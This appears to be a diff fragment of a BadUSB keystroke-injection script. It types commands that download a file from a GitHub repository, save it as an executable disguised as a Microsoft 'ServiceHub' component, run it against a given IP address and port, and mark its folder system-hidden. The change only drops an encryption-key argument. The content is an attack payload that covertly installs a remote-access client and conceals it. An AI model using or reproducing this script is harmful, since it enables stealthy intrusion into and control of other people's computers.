@@ -11,7 +11,7 @@ ENTER
 STRING Start-BitsTransfer -Source https://github.com/Guy-Falk/EthicalHacking/raw/refs/heads/main/ServiceHub.RootHost.zip -Destination c:/Microsoft/Services/ServiceHub.RootHost.exe
 ENTER
 DELAY 100
-STRING c:/Microsoft/Services/ServiceHub.RootHost #[Encrypt Key] -I [IP Address] -P [port]
+STRING c:/Microsoft/Services/ServiceHub.RootHost -I [IP Address] -P [port]
 ENTER
 STRING attrib +S +H c:/Microsoft.ServiceHub
 ENTER
